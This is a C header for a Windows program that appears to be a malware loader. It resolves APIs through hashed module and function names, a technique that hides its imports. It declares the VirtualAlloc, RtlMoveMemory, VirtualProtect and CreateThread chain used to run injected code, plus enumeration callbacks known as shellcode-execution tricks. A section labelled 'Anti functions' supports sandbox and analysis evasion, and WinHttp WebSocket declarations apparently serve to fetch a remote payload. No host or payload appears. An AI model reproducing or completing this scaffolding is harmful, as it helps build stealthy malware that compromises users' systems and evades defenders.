#ifndef __UTIL_H
#define __UTIL_H

#include <windows.h>
#include <winhttp.h>
#include <shlwapi.h>
#include <powrprof.h>
#include <tlhelp32.h>

#include "peb.h"

// Module hashes
#define H_NT    0x22D3B5ED
#define H_K32   0x6DDB9555

#define H_US32  0x5A6BD3F3
#define H_HTTP  0x920E337D
#define H_SHLW  0xFB76EC07
#define H_MSVC  0xFF6C2F6E
#define H_CRYP  0xAAD5E4
#define H_POWR  0x5E75396E

// Function hashes

#define H_LL            0x5FBFF0FB
#define H_GPA           0xCF31BB1F
#define H_VP            0x844FF18D
#define H_STI           0x7516C16A
#define H_VA            0x382C0F97
#define H_RTLMV         0x4027607
#define H_MK_THREAD     0x7F08F451
#define H_CLSHNDL       0x3870CA07
#define H_WFSO          0xECCDA1BA
#define H_ENUMPOWR      0xC958BC3B
#define H_FNDWNDA       0x8840293F
#define H_GETCNMA       0xAA63BFB6
#define H_GETTL32SNAP   0x66851295
#define H_PROC32F       0x9278b871
#define H_PROC32N       0x90177f28
#define H_QPREFCOUNT    0xdb4e150d
#define H_SLEEP         0xe19e5fe
#define H_EXITP         0xb769339e
#define H_ENUMCODEPGS   0xcb59690b
#define H_ENUMUILANGS   0x4421d490

// WinHttp
#define H_WH_OPEN       0x5E4F39E5
#define H_WH_CONN       0x7242C17D
#define H_WH_SETOP      0xA18B94F8
#define H_WH_OPNREQ     0xEAB7B9CE
#define H_WH_SNDREQ     0xB183FAA6
#define H_WH_CLSHNDL    0x36220CD5
#define H_WH_WSSUPG     0x58929DB
#define H_WH_WSSCLS     0x89265090
#define H_WH_RCVRSP     0x146C4925
#define H_WH_WSSRCV     0xDD7174BD
#define H_WH_ADDRQHDR   0xED7FCB41

typedef HMODULE (*LoadLibraryA_t)( LPCSTR lpLibFileName );

typedef FARPROC (*GetProcAddress_t)(

    HMODULE hModule,
    LPCSTR  lpProcName

);

// VirtualProtect
typedef BOOL (*VirtualProtect_t)(

    LPVOID lpAddress,
    SIZE_T dwSize,
    WORD  flNewProtect,
    PDWORD lpflOldProtect

);

typedef HINTERNET (WINHTTPAPI *WinHttpOpen_t)(

        LPCWSTR pszAgentW,
        DWORD dwAccessType,
        LPCWSTR pszProxyW,
        LPCWSTR pszProxyBypassW,
        DWORD dwFlags
);

typedef HINTERNET (WINHTTPAPI *WinHttpConnect_t)(

        HINTERNET hSession,
        LPCWSTR pswzServerName,
        INTERNET_PORT nServerPort,
        DWORD dwReserved
);

typedef HINTERNET (WINHTTPAPI *WinHttpOpenRequest_t)(

        HINTERNET hConnect,
        LPCWSTR   pwszVerb,
        LPCWSTR   pwszObjectName,
        LPCWSTR   pwszVersion,
        LPCWSTR   pwszReferrer,
        LPCWSTR   *ppwszAcceptTypes,
        DWORD     dwFlags

);

typedef BOOL (WINHTTPAPI *WinHttpSetOption_t)(

        HINTERNET hInternet,
        DWORD dwOption,
        LPVOID lpBuffer,
        DWORD dwBufferLength

);

typedef BOOL (WINHTTPAPI *WinHttpAddRequestHeaders_t)(

        HINTERNET hRequest,
        LPCWSTR lpszHeaders,
        DWORD dwHeadersLength,
        DWORD dwModifiers

);

typedef BOOL (WINHTTPAPI *WinHttpSendRequest_t)(

        HINTERNET hRequest,
        LPCWSTR lpszHeaders,
        DWORD dwHeadersLength,
        LPVOID lpOptional,
        DWORD dwOptionalLength,
        DWORD dwTotalLength,
        DWORD_PTR dwContext

);

typedef BOOL (WINHTTPAPI *WinHttpReceiveResponse_t)( HINTERNET hRequest, LPVOID lpReserved);

typedef HINTERNET (WINHTTPAPI *WinHttpWebSocketCompleteUpgrade_t)(HINTERNET hRequest, DWORD_PTR pContext);

typedef DWORD (WINHTTPAPI *WinHttpWebSocketReceive_t)(

        HINTERNET hWebSocket,
        PVOID pvBuffer,
        DWORD dwBufferLength,
        DWORD *pdwBytesRead,
        WINHTTP_WEB_SOCKET_BUFFER_TYPE *peBufferType

);

typedef BOOL (WINHTTPAPI *WinHttpCloseHandle_t)(HINTERNET hInternet);

typedef DWORD (WINHTTPAPI *WinHttpWebSocketClose_t)(

        HINTERNET hWebSocket,
        USHORT usStatus,
        PVOID pvReason,
        DWORD dwReasonLength

);

typedef BOOL (*StrToIntExA_t)(

        PCSTR pszString,
        STIF_FLAGS dwFlags,
        int *piRet
);

// VirtualAlloc
typedef LPVOID (*VirtualAlloc_t)(

        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect

);

// RtlMoveMemory
typedef VOID (*movemem_t)(

    VOID UNALIGNED *Destination,
    VOID UNALIGNED *Source,
    SIZE_T         Length

);

typedef HANDLE (*CreateThread_t)(

        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId

);

typedef DWORD (*WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);

typedef BOOL (*CloseHandle_t)(HANDLE hObject);

typedef BOOLEAN (*EnumPwrSchemes_t)(

        PWRSCHEMESENUMPROC lpfn,
        LPARAM             lParam
);

typedef HWND (*FindWindowA_t)(

        LPCSTR lpClassName,
        LPCSTR lpWindowName
);

typedef BOOL (*GetComputerNameA_t)(LPSTR lpBuffer, LPDWORD nSize);

typedef HANDLE (*CreateToolhelp32Snapshot_t)(

        DWORD dwFlags,
        DWORD th32ProcessID

);

typedef BOOL (*Process32First_t)(

        HANDLE hSnapshot,
        LPPROCESSENTRY32 lppe
);

typedef BOOL (*Process32Next_t)(

        HANDLE hSnapshot,
        LPPROCESSENTRY32 lppe
);

typedef BOOL (*QueryPerformanceCounter_t)( LARGE_INTEGER *lpPerformanceCount );

typedef void (*Sleep_t)( DWORD dwMilliseconds );

typedef void (*ExitProcess_t)( UINT uExitCode );

typedef BOOL (*EnumSystemCodePagesA_t)(

        CODEPAGE_ENUMPROCA lpCodePageEnumProc,
        DWORD              dwFlags

);

typedef BOOL (*EnumUILanguagesA_t)(

        UILANGUAGE_ENUMPROCA lpUILanguageEnumProc,
        DWORD                dwFlags,
        LONG_PTR             lParam

);

typedef struct _CORE {

    struct {

        // Core functions

        StrToIntExA_t StrToIntExA;
        VirtualAlloc_t VirtualAlloc;
        movemem_t movemem;
        LoadLibraryA_t LoadLibraryA;
        GetProcAddress_t GetProcAddress;
        VirtualProtect_t VirtualProtect;
        CreateThread_t CreateThread;
        WaitForSingleObject_t WaitForSingleObject;
        CloseHandle_t CloseHandle;
        FindWindowA_t FindWindowA;

        // Anti functions

        GetComputerNameA_t GetComputerNameA;
        CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot;
        Process32First_t Process32First;
        Process32Next_t Process32Next;
        QueryPerformanceCounter_t QueryPerformanceCounter;
        Sleep_t Sleep;
        ExitProcess_t ExitProcess;

        // Callback functions

        EnumPwrSchemes_t EnumPwrSchemes;
        EnumUILanguagesA_t EnumUILanguagesA;
        EnumSystemCodePagesA_t EnumSystemCodePagesA;

        // WinHttp

        WinHttpOpen_t WinHttpOpen;
        WinHttpConnect_t WinHttpConnect;
        WinHttpSetOption_t WinHttpSetOption;
        WinHttpCloseHandle_t WinHttpCloseHandle;
        WinHttpOpenRequest_t WinHttpOpenRequest;
        WinHttpSendRequest_t WinHttpSendRequest;
        WinHttpWebSocketClose_t WinHttpWebSocketClose;
        WinHttpReceiveResponse_t WinHttpReceiveResponse;
        WinHttpWebSocketReceive_t WinHttpWebSocketReceive;
        WinHttpAddRequestHeaders_t WinHttpAddRequestHeaders;
        WinHttpWebSocketCompleteUpgrade_t WinHttpWebSocketCompleteUpgrade;

    } api;

    struct {

        HMODULE nt;
        HMODULE k32;
        HMODULE u32;
        HMODULE http;
        HMODULE shlw;
        HMODULE msvc;
        HMODULE powr;

    } mod;

} CORE, *PCORE;

ULONG djb2(PCHAR str);
ULONG djb2_w(PWCHAR wstr);
HMODULE get_mod_handle(ULONG mod_hash);
VOID setmem(PVOID dst, UCHAR value, UINT64 size);
FARPROC get_proc_addr(HMODULE mod, ULONG proc_hash);

#endif // __UTIL_H